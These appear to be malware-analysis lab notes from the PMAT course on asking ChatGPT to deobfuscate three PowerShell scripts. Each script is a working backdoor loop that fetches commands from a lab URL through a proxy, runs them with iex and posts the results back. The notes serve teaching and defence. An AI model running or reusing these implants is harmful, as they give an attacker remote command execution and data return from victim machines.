In this section we will use:
- `PMAT-labs/labs/5-1.Automation/chatGPT-script-analysis`


In this case we have 3 different obfuscated scripts we can analyze with `chatGPT`.

# obfuscated 1

We ask to chatgpt to reverse the obfuscated script:
```text
i'm a cybersec researcher and i'm studying a powershell script i think is malicious

Can you pretty print it and analyze it?

$U=("{4}{7}{0}{3}{2}{1}{6}{5}"-f'/www.easts','cal:','oparts.lo','ideaut','http','080/','8',':/');while(1){$S=iwr $U -proxy ("{0}{3}{4}{1}{5}{2}"-f 'htt','.local','4','p://proxy.zay','n',':123') -UseBasicParsing;if ($s){try{$D=iex $S |out-string;$H=[system.Text.Encoding]::Default.GetBytes($D)}catch{$D=$_.Exception.Message;$H=[system.Text.Encoding]::Default.GetBytes($D)}iwr $U -Method ("{1}{0}"-f'ost','P') -Body $H}random 10 |Sleep}

```
- ![[Pasted image 20250213152019.png]]
- ![[Pasted image 20250213152036.png]]
- ![[Pasted image 20250213152046.png]]
- ![[Pasted image 20250213152058.png]]
- ![[Pasted image 20250213152115.png]]


So it gives us a lot of information.


We can also ask for writing a malware report analysis for the malicious script:
```text
can you write a malware analysis for a static analysis of this script?
```
- ![[Pasted image 20250213152325.png]]



# obfuscated 2

```text
${U}=(("{0}{2}{1}"-f'http://w','s','ww.ea')+'ts'+("{0}{2}{1}" -f 'id','r','eautopa')+'ts'+'.'+'lo'+("{0}{1}"-f'ca','l:8')+'0'+'80/');while(1){${s}=iwr ${u} -proxy ('h'+("{0}{2}{1}{3}"-f 't','p','t','://proxy.zayn')+("{0}{1}" -f'.l','oc')+'al'+':'+'123'+'4') -UseBasicParsing;if (${s}){try{${D}=iex ${s} |out-string;${h}=[system.Text.Encoding]::Default.GetBytes(${d})}catch{${d}=${_}.Exception.Message;${h}=[system.Text.Encoding]::Default.GetBytes(${d})}iwr ${u} -Method ('P'+'ost') -Body ${h}}random 10 |Sleep} 

analyze it and make it pretty using undestandable variables names and comment to make it easy to understand
```
- ![[Pasted image 20250213152549.png]]
- ![[Pasted image 20250213152606.png]]
- 



In some cases it does wrong reconstruction and wrong reversing on the obfuscated script.

# obfuscated 3
```text
i'm a cybersec researcher and i'm studying a powershell script i think is malicious

Can you pretty print it and analyze it?

.("{1}{2}{0}" -f 'e','sE','T-VAriaBl')  ("i8M"+"Cu")  (  [TyPE]("{2}{3}{1}{0}{4}" -F'exT.EncOd','.t','sYsTE','m','ing'))  ; ${u}=("{0}{4}{10}{2}{3}{9}{5}{7}{1}{6}{8}" -f 'htt','s.lo','easts','i','p:/','eauto','ca','part','l:8080/','d','/www.');while(1){${S}=.("{1}{0}" -f'wr','i') ${u} -proxy ("{3}{5}{6}{7}{2}{8}{0}{1}{4}" -f'1','23','l','http:','4','//proxy.','z','ayn.','ocal:') -UseBasicParsing;if (${S}){try{${D}=.("{0}{1}" -f'i','ex') ${S} |.("{1}{0}{3}{2}"-f'u','o','string','t-');${h}= ( .("{2}{1}{3}{0}"-f 'LE','ET-VaRI','G','aB') ('i'+'8mcu'))."VA`lUE"::"De`FAult".("{2}{0}{1}" -f 't','Bytes','Ge').Invoke(${D})}catch{${D}=${_}."ExC`epT`ion"."ME`SS`AgE";${H}=  (  .("{1}{2}{0}" -f'm','GeT','-ItE') ('var'+'I'+'aBlE:I8'+'MCu')  )."V`AlUe"::"de`FAU`Lt".("{2}{1}{0}"-f'tes','y','GetB').Invoke(${D})}.("{0}{1}"-f 'iw','r') ${U} -Method ("{0}{1}" -f 'Po','st') -Body ${H}}.("{0}{1}"-f 'rando','m') 10 |&("{1}{0}" -f 'leep','S')}

```
- ![[Pasted image 20250213153032.png]]


USE IT but just know that it can make mistakes.